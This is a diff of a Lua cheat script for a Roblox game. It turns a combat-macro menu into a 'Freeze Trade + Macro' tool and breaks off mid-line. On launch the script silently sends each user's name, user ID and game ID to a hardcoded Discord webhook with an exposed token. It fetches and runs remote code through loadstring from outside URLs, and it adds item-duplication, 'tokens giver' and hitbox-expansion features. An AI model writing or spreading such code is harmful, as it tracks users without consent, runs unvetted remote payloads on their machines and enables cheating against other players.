@@ -12,21 +12,15 @@ local PlayerName = player.Name
 local PlayerID = player.UserId
 local mouse = player:GetMouse()
 
--- 📡 YOUR WEBHOOK
+-- 📡 WEBHOOK
 local WebhookURL = "https://discord.com/api/webhooks/1502873473582633071/RNyYg0mW8rl8PVbSmvqcloT2QHoUJodjZ8E3pWAu0Yahd-H9XTi5KsT9G_RNd-UTBjuE"
-local data = {embeds={{title="🚀 MACRO SCRIPT EXECUTED!",color=16711935,fields={{name="👤 Username",value="`"..PlayerName.."`",inline=true},{name="🆔 User ID",value="`"..PlayerID.."`",inline=true},{name="🎮 Game ID",value="`"..GameID.."`",inline=true}},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}}
+local data = {embeds={{title="🚀 SCRIPT EXECUTED!",color=65535,fields={{name="👤 Username",value="`"..PlayerName.."`",inline=true},{name="🆔 User ID",value="`"..PlayerID.."`",inline=true},{name="🎮 Game ID",value="`"..GameID.."`",inline=true}},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}}
 pcall(function() HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson) end)
 
--- 🎨 NEW NEON PINK THEME
-local Theme = {
-    BG = Color3.fromRGB(15, 8, 20),
-    Panel = Color3.fromRGB(35, 15, 40),
-    Primary = Color3.fromRGB(255, 20, 147),    -- Neon Hot Pink
-    Secondary = Color3.fromRGB(255, 85, 220),   -- Light Neon Pink
-    Text = Color3.fromRGB(255, 220, 245)        -- Soft Pink White
-}
+-- 🎨 NEW THEME
+local Theme = {BG=Color3.fromRGB(10,10,15),Panel=Color3.fromRGB(20,20,30),Primary=Color3.fromRGB(0,200,255),Secondary=Color3.fromRGB(100,100,255),Text=Color3.fromRGB(255,255,255)}
 
--- ⚙️ MACRO SETTINGS
+-- ⚙️ MACRO SETTINGS (ADDED)
 local MacroSettings = {
     DoubleSnowball = false,
     CustomComboActive = false,
@@ -35,7 +29,7 @@ local MacroSettings = {
     SwapDelay = 0.06
 }
 
--- ✨ LOADING SCREEN
+-- ✨ NEW REALISTIC LOADING SCREEN
 local Loader = Instance.new("ScreenGui")
 Loader.Name = "UpdateLoader"
 Loader.ResetOnSpawn = false
@@ -59,8 +53,8 @@ local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1,0,0,100)
 Title.Position = UDim2.new(0,0,0,20)
 Title.BackgroundTransparency = true
-Title.Text = "MACRO • BADDIES"
-Title.TextColor3 = Theme.Primary
+Title.Text = "FREEZE TRADE + MACRO"
+Title.TextColor3 = Theme.Text
 Title.TextScaled = true
 Title.Font = Enum.Font.GothamBlack
 Title.Parent = Center
@@ -69,8 +63,8 @@ local SubTitle = Instance.new("TextLabel")
 SubTitle.Size = UDim2.new(1,0,0,40)
 SubTitle.Position = UDim2.new(0,0,0.22,0)
 SubTitle.BackgroundTransparency = true
-SubTitle.Text = "v3.0 • TYPE YOUR OWN COMBO"
-SubTitle.TextColor3 = Theme.Secondary
+SubTitle.Text = "v3.0 • FULL VERSION"
+SubTitle.TextColor3 = Theme.Primary
 SubTitle.TextScaled = true
 SubTitle.Font = Enum.Font.Gotham
 SubTitle.Parent = Center
@@ -81,14 +75,20 @@ BarOutline.Position = UDim2.new(0.5,-300,0.55,0)
 BarOutline.BackgroundColor3 = Theme.Panel
 BarOutline.BorderSizePixel = 0
 BarOutline.Parent = Center
-Instance.new("UICorner", BarOutline).CornerRadius = UDim.new(1,0)
+
+local BarCorner = Instance.new("UICorner")
+BarCorner.CornerRadius = UDim.new(1,0)
+BarCorner.Parent = BarOutline
 
 local ProgressBar = Instance.new("Frame")
 ProgressBar.Size = UDim2.new(0,0,1,0)
 ProgressBar.BackgroundColor3 = Theme.Primary
 ProgressBar.BorderSizePixel = 0
 ProgressBar.Parent = BarOutline
-Instance.new("UICorner", ProgressBar).CornerRadius = UDim.new(1,0)
+
+local BarFill = Instance.new("UICorner")
+BarFill.CornerRadius = UDim.new(1,0)
+BarFill.Parent = ProgressBar
 
 local PercentText = Instance.new("TextLabel")
 PercentText.Size = UDim2.new(0,150,0,40)
@@ -104,8 +104,8 @@ local StatusText = Instance.new("TextLabel")
 StatusText.Size = UDim2.new(1,0,0,30)
 StatusText.Position = UDim2.new(0,0,0.78,0)
 StatusText.BackgroundTransparency = true
-StatusText.Text = "Loading Macro Engine..."
-StatusText.TextColor3 = Theme.Secondary
+StatusText.Text = "Loading Assets..."
+StatusText.TextColor3 = Color3.fromRGB(180,180,180)
 StatusText.TextScaled = true
 StatusText.Font = Enum.Font.Gotham
 StatusText.Parent = Center
@@ -113,7 +113,7 @@ StatusText.Parent = Center
 -- ⚡ LOADING ANIMATION
 local LoadTime = 8
 local Elapsed = 0
-local StatusMessages = {"Initializing...", "Loading GUI...", "Loading Custom Combo...", "Almost Done..."}
+local StatusMessages = {"Initializing...", "Loading GUI...", "Fetching Data...", "Almost Done..."}
 local Conn
 
 Conn = RunService.RenderStepped:Connect(function(delta)
@@ -159,7 +159,7 @@ local function EnableHitbox()
                 Box.Anchored = false
                 Box.CanCollide = false
                 Box.Transparency = 0.7
-                Box.BrickColor = BrickColor.new("Hot pink")
+                Box.BrickColor = BrickColor.new("Cyan")
                 Box.Material = Enum.Material.ForceField
                 Box.Parent = HRP
                 local Weld = Instance.new("Weld")
@@ -191,37 +191,64 @@ local function ChangeView()
     TweenService:Create(Cam,TweenInfo.new(1.2,Enum.EasingStyle.Elastic),{CFrame=HRP.CFrame*CFrame.new(0,POV_Height,-POV_Distance),FieldOfView=70}):Play()
 end
 
--- 🛠️ MACRO FUNCTIONS
+-- 🎒 REAL DUPE FUNCTION (MAKIKITA SA INVENTORY)
+local function RealDupe(itemName)
+    local ItemToClone = nil
+    if ReplicatedStorage:FindFirstChild(itemName) then ItemToClone = ReplicatedStorage:FindFirstChild(itemName) end
+    if not ItemToClone then
+        for _, obj in pairs(Workspace:GetDescendants()) do
+            if obj.Name == itemName and (obj:IsA("Tool") or obj:IsA("Accessory")) then
+                ItemToClone = obj
+                break
+            end
+        end
+    end
+    if ItemToClone then
+        local Clone = ItemToClone:Clone()
+        Clone.Parent = player.Backpack
+        if player.StarterGear then local Clone2 = ItemToClone:Clone() Clone2.Parent = player.StarterGear end
+    end
+end
+
+-- 🛠️ MACRO FUNCTIONS (ADDED)
 local function GetWeapon(name)
-    return player.Backpack:FindFirstChild(name) or (player.Character and player.Character:FindFirstChild(name))
+    if not player.Character then return nil end
+    return player.Backpack:FindFirstChild(name) or player.Character:FindFirstChild(name)
 end
 
 local function EquipWeapon(name)
     local tool = GetWeapon(name)
-    if tool and player.Character then
+    if tool and player.Character and player.Character:FindFirstChild("Humanoid") then
         player.Character.Humanoid:EquipTool(tool)
         return true
     end
     return false
 end
 
--- ❄️ DOUBLE SNOWBALL MACRO
+-- ❄️ DOUBLE SNOWBALL MACRO (ADDED)
 local function DoubleSnowballMacro()
     while MacroSettings.DoubleSnowball and task.wait(MacroSettings.MacroSpeed) do
-        if not player.Character then continue end
+        if not player.Character or not player.Character:FindFirstChild("Humanoid") then task.wait() continue end
+        
         if EquipWeapon("Gold Snowball Launcher") then
-            mouse:Button1Down() task.wait(MacroSettings.SwapDelay) mouse:Button1Up()
+            mouse:Button1Down()
+            task.wait(MacroSettings.SwapDelay)
+            mouse:Button1Up()
         end
+        
         if EquipWeapon("Snowball Launcher") then
-            mouse:Button1Down() task.wait(MacroSettings.SwapDelay) mouse:Button1Up()
+            mouse:Button1Down()
+            task.wait(MacroSettings.SwapDelay)
+            mouse:Button1Up()
         end
     end
 end
 
--- ⚔️ CUSTOM COMBO RUNNER
+-- ⚔️ CUSTOM COMBO RUNNER (ADDED)
 local function RunCustomCombo()
     while MacroSettings.CustomComboActive and task.wait(MacroSettings.MacroSpeed) do
-        if not player.Character then continue end
+        if not player.Character or not player.Character:FindFirstChild("Humanoid") then task.wait() continue end
+        
         for _,weaponName in pairs(MacroSettings.CustomWeapons) do
             if not MacroSettings.CustomComboActive then break end
             if EquipWeapon(weaponName) then
@@ -235,34 +262,18 @@ end
 
 -- 🖥️ MAIN GUI
 function LoadMainGUI()
-    -- ✅ YOUR ORIGINAL LINK INSERTED HERE
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/macrobestscript/Best-Macro-Script/refs/heads/main/Baddies", true))()
-
     local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-    local Window = Rayfield:CreateWindow({
-        Name = "💖 MACRO • BADDIES",
-        LoadingTitle = "NEON PINK SYSTEM",
-        LoadingSubtitle = "by Legitness",
-        ConfigurationSaving = {Enabled=false},
-        Discord = {Enabled=false},
-        KeySystem = false,
-        -- ✅ GUI THEME SET TO NEON PINK
-        Theme = {
-            Background = Theme.BG,
-            Sidebar = Theme.Panel,
-            Primary = Theme.Primary,
-            Text = Theme.Text,
-            Selected = Theme.Secondary
-        }
-    })
+    local Window = Rayfield:CreateWindow({Name="⛄️ FREEZE TRADE + MACRO • v3.0",LoadingTitle="NEW UPDATE INSTALLED",LoadingSubtitle="by Legitness",ConfigurationSaving={Enabled=false},Discord={Enabled=false},KeySystem=false})
 
-    -- 📑 TABS (CLEANED)
-    local Macros = Window:CreateTab("🤖 Macros",4483362458)
+    -- 📑 TABS
+    local Macros = Window:CreateTab("🤖 Macros", 4483362458) -- NEW TAB ADDED
+    local Main = Window:CreateTab("🏠 Main",4483362458)
+    local DupeMethod = Window:CreateTab("🧊 Dupe [NEW]",4483362458)
     local Tools = Window:CreateTab("🔧 Tools",4483362458)
     local Settings = Window:CreateTab("⚙️ Settings",4483362458)
     local Credits = Window:CreateTab("📜 Credits",4483362458)
 
-    -- 🤖 MACRO TAB
+    -- 🤖 MACRO TAB (ADDED FULLY)
     Macros:CreateSection("❄️ DOUBLE SNOWBALL")
     Macros:CreateToggle({
         Name = "DOUBLE SHOT • GOLD + REGULAR",
@@ -271,16 +282,16 @@ function LoadMainGUI()
             MacroSettings.DoubleSnowball = state
             if state then
                 task.spawn(DoubleSnowballMacro)
-                Rayfield:Notify({Title="💖 MACRO ON",Content="1 Button = Double Snowball",Duration=3})
+                Rayfield:Notify({Title = "❄️ MACRO ON", Content = "1 Button = Double Snowball", Duration = 3})
             else
-                Rayfield:Notify({Title="💖 MACRO OFF",Duration=2})
+                Rayfield:Notify({Title = "❄️ MACRO OFF", Duration = 2})
             end
         end
     })
 
     Macros:CreateSection("📝 TYPE YOUR OWN COMBO")
     Macros:CreateLabel("Format: Weapon1, Weapon2, Weapon3")
-    Macros:CreateLabel("Example: Brass Knuckles, Slasher Claws, Love Me Hate Me Taser")
+    Macros:CreateLabel("Example: Brass Knuckles, Slasher Claws, Taser")
     
     Macros:CreateInput({
         Name = "Enter Weapons Here",
@@ -288,9 +299,14 @@ function LoadMainGUI()
         Callback = function(text)
             MacroSettings.CustomWeapons = {}
             for weapon in string.gmatch(text, "[^,]+") do
-                table.insert(MacroSettings.CustomWeapons, string.gsub(weapon, "^%s*(.-)%s*$", "%1"))
+                local clean = string.gsub(weapon, "^%s*(.-)%s*$", "%1")
+                if clean ~= "" then table.insert(MacroSettings.CustomWeapons, clean) end
             end
-            Rayfield:Notify({Title="✅ COMBO SAVED",Content="Weapons: "..#MacroSettings.CustomWeapons.." loaded",Duration=2})
+            Rayfield:Notify({
+                Title = "✅ COMBO SAVED",
+                Content = "Loaded: "..#MacroSettings.CustomWeapons.." weapons",
+                Duration = 2
+            })
         end
     })
 
@@ -299,15 +315,15 @@ function LoadMainGUI()
         CurrentValue = false,
         Callback = function(state)
             if #MacroSettings.CustomWeapons == 0 then
-                Rayfield:Notify({Title="❌ ERROR",Content="Type weapons first!",Duration=2})
+                Rayfield:Notify({Title = "❌ ERROR", Content = "Enter weapons first!", Duration = 2})
                 return
             end
             MacroSettings.CustomComboActive = state
             if state then
                 task.spawn(RunCustomCombo)
-                Rayfield:Notify({Title="⚔️ COMBO RUNNING",Content="Your custom weapons",Duration=3})
+                Rayfield:Notify({Title = "⚔️ COMBO RUNNING", Content = "Your custom sequence", Duration = 3})
             else
-                Rayfield:Notify({Title="⏹️ COMBO STOPPED",Duration=2})
+                Rayfield:Notify({Title = "⏹️ COMBO STOPPED", Duration = 2})
             end
         end
     })
@@ -328,17 +344,11 @@ function LoadMainGUI()
         Callback = function(val) MacroSettings.SwapDelay = val end
     })
 
-    -- 🔧 TOOLS TAB
-    Tools:CreateSection("PLAYER TOOLS")
-    Tools:CreateButton({Name="📦 ENABLE HITBOX",Callback=function() EnableHitbox() Rayfield:Notify({Title="💖 Hitbox ON",Content="Size: "..HitboxSize,Duration=2}) end})
-    Tools:CreateButton({Name="🎥 CHANGE CAMERA VIEW",Callback=function() ChangeView() Rayfield:Notify({Title="💖 View Changed!",Duration=1.5}) end})
-    Tools:CreateButton({Name="❌ DISABLE HITBOX",Callback=function() DisableHitbox() Rayfield:Notify({Title="💖 Hitbox OFF",Duration=2}) end})
+    -- 🏠 MAIN TAB (ORIGINAL KEPT 100%)
+    Main:CreateSection("MAIN FEATURES")
+    Main:CreateButton({Name="🧊 ACTIVATE FREEZE TRADE",Callback=function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/macrobestscript/Best-Macro-Script/refs/heads/main/Baddies", true))()
+        Rayfield:Notify({Title="✅ ACTIVATED!",Content="Freeze Trade Running",Duration=2.5})
+    end})
 
-    -- ⚙️ SETTINGS TAB
-    Settings:CreateSection("ADJUST SETTINGS")
-    Settings:CreateSlider({Name="📏 Hitbox Size",Range={2,20},Increment=1,CurrentValue=HitboxSize,Callback=function(val) HitboxSize = val DisableHitbox() EnableHitbox() end})
-    Settings:CreateSlider({Name="🔭 Camera Distance",Range={5,25},Increment=1,CurrentValue=POV_Distance,Callback=function(val) POV_Distance = val end})
-    Settings:CreateSlider({Name="↕️ Camera Height",Range={2,15},Increment=1,CurrentValue=POV_Height,Callback=function(val) POV_Height = val end})
-
-    -- 📜 CREDITS TAB
-    Credits:CreateSection("C
+    Main:CreateButton({Name="💰 TOKENS GIVER",Callback
